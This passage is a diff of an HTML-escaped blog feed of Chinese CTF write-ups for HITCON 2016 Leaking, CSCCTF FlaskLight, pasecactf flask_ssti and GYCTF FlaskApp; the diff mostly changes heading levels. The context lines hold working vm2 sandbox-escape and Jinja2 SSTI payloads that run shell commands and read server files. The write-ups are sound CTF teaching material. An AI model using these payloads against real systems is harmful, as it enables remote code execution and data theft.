class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`s`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`s`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`join`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))[[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`x`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`c`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`S`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`y`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`n`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`c`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`join`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`cat /flag`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`toString`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]();&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;})()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;hitcon-2016leaking&#34;&gt;[HITCON 2016]Leaking&lt;/h1&gt;
+&lt;/div&gt;&lt;h2 id=&#34;hitcon-2016leaking&#34;&gt;[HITCON 2016]Leaking&lt;/h2&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -15132,7 +14143,7 @@ md5值：BBD6FC7CC3A6E0F3B7260B2CDB24717B&lt;br&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;主页面GET传参data，通过&lt;strong&gt;数组绕过&lt;/strong&gt;长度判断。&lt;/p&gt;
-&lt;h2 id=&#34;方法一---vm2逃逸&#34;&gt;方法一 - vm2逃逸&lt;/h2&gt;
+&lt;h3 id=&#34;方法一---vm2逃逸&#34;&gt;方法一 - vm2逃逸&lt;/h3&gt;
 &lt;p&gt;用&lt;code&gt;[HFCTF2020]JustEscape&lt;/code&gt;的payload就行，&lt;/p&gt;
 &lt;p&gt;payload&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -15143,7 +14154,7 @@ md5值：BBD6FC7CC3A6E0F3B7260B2CDB24717B&lt;br&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(()=&amp;gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;TypeError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`p`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`o`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`t`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`o`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`t`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`y`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`p`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`join`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)][&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`a`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`c`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`o`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`n`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`s`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`t`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`u`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`c`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`t`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`o`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`join`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]([&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`t`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`u`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`n`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;` `&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`p`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`o`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`c`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`s`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`s`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`join`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))();&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`preventExtensions`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`from`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`a`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`a`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](()=&amp;gt;{})[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`mainModule`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`q`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`u`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`i`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`join`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]([&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`c`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`h`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`i`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`l`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`d`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`_`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`p`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`r`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`o`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`c`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`s`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`s`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`join`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))[[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`x`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`e`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`c`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`S`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`y`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`n`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`c`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`join`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;``&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)](&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`cat /app/config.js`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`toString`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]();&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;})()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;方法二---buffer读取&#34;&gt;方法二 - Buffer读取&lt;/h2&gt;
+&lt;/div&gt;&lt;h3 id=&#34;方法二---buffer读取&#34;&gt;方法二 - Buffer读取&lt;/h3&gt;
 &lt;p&gt;来自&lt;a href=&#34;https://blog.csdn.net/SopRomeo/article/details/108963957&#34;&gt;[HITCON 2016]Leaking 记录&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;低版本的node可以使用buffer()来查看内存，只要调用过的变量，都会存在内存中，那么我们可以构造paylaod读取内存。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -16418,7 +15429,7 @@ By the way,the picture shoud be used
                 
                 <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                 
-                    <description>&lt;h1 id=&#34;cscctf-2019-qualflasklight----ssti&#34;&gt;[CSCCTF 2019 Qual]FlaskLight -- SSTI&lt;/h1&gt;
+                    <description>&lt;h2 id=&#34;cscctf-2019-qualflasklight&#34;&gt;[CSCCTF 2019 Qual]FlaskLight&lt;/h2&gt;
 &lt;p&gt;F12得到一段信息：&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Parameter Name: search&lt;br&gt;
@@ -16452,7 +15463,7 @@ Method: GET&lt;/p&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;p&#34;&gt;{{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__class__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__mro__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;__subclasses__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;258&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cat /flasklight/coomme_geeeett_youur_flek&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;communicate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()}}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;pasecactf_2019flask_ssti----ssti-bypass&#34;&gt;[pasecactf_2019]flask_ssti -- SSTI-bypass&lt;/h1&gt;
+&lt;/div&gt;&lt;h2 id=&#34;pasecactf_2019flask_ssti&#34;&gt;[pasecactf_2019]flask_ssti&lt;/h2&gt;
 &lt;p&gt;题目描述：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -16494,7 +15505,7 @@ Method: GET&lt;/p&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;p&#34;&gt;{{()[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x5F\x5F&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x5F\x5F&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x5F\x5F&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;bases&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x5F\x5F&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x5F\x5F&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;subclasses&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x5F\x5F&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]()[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;91&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;get&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x5F&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/proc/self/fd/3&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)}}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;gyctf-2020flaskapp----pin&#34;&gt;[GYCTF 2020]FlaskApp -- PIN&lt;/h1&gt;
+&lt;/div&gt;&lt;h2 id=&#34;gyctf-2020flaskapp----pin&#34;&gt;[GYCTF 2020]FlaskApp -- PIN&lt;/h2&gt;
 &lt;p&gt;      先看一下整体功能，一共有三个路由，分别用来&lt;strong&gt;base64加密、base64解密和提示&lt;/strong&gt;，而提示的源代码处有&lt;code&gt;&amp;lt;!-- PIN ---&amp;gt;&lt;/code&gt;的hint，想来应该是开了debug需要我们计算PIN码。&lt;/p&gt;
 &lt;p&gt;      现在回看之前的输入框，直接尝试模板注入&lt;code&gt;{{7*7}}&lt;/code&gt;，在加密路由的输入框中正常回显，而在解密路由中返回了&lt;code&gt;no no no !! &lt;/code&gt;的字符，接着尝试&lt;code&gt;{{1+1}}&lt;/code&gt;返回了2，证明存在&lt;strong&gt;模板注入漏洞&lt;/strong&gt;。一番瞎jr尝试后，通过debug界面，获得部分源码：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -16558,7 +15569,7 @@ Method: GET&lt;/p&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;接下来有&lt;strong&gt;两种方法&lt;/strong&gt;完成flag读取：&lt;/p&gt;
-&lt;h2 id=&#34;解一字符串拼接&#34;&gt;解一：字符串拼接&lt;/h2&gt;
+&lt;h3 id=&#34;解一字符串拼接&#34;&gt;解一：字符串拼接&lt;/h3&gt;
 &lt;p&gt;      非预期，这种方法原理是&lt;code&gt;通过字符串拼接绕过waf列举目录获得flag文件名，然后读取flag&lt;/code&gt;。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -16575,7 +15586,7 @@ Method: GET&lt;/p&gt;
 &lt;p&gt;&#39;bin&#39;, &#39;boot&#39;, &#39;dev&#39;, &#39;etc&#39;, &#39;home&#39;, &#39;lib&#39;, &#39;lib64&#39;, &#39;media&#39;, &#39;mnt&#39;, &#39;opt&#39;, &#39;proc&#39;, &#39;root&#39;, &#39;run&#39;, &#39;sbin&#39;, &#39;srv&#39;, &#39;sys&#39;, &#39;tmp&#39;, &#39;usr&#39;, &#39;var&#39;, &#39;this_is_the_flag.txt&#39;, &#39;.dockerenv&#39;, &#39;app&#39;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;发现根目录下flag文件名为&lt;code&gt;this_is_the_flag.txt&lt;/code&gt;，接下来读取flag(&lt;strong&gt;两种方法&lt;/strong&gt;)：&lt;/p&gt;
-&lt;h3 id=&#34;读取flag一字符串拼接&#34;&gt;读取flag一：字符串拼接&lt;/h3&gt;
+&lt;h4 id=&#34;读取flag一字符串拼接&#34;&gt;读取flag一：字符串拼接&lt;/h4&gt;
 &lt;p&gt;payload：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -16585,7 +15596,7 @@ Method: GET&lt;/p&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__class__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;__base__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;__subclasses__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}{&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;catch_warnings&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}{{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;fm&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;vm&#34;&gt;__globals__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__builtins__&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span 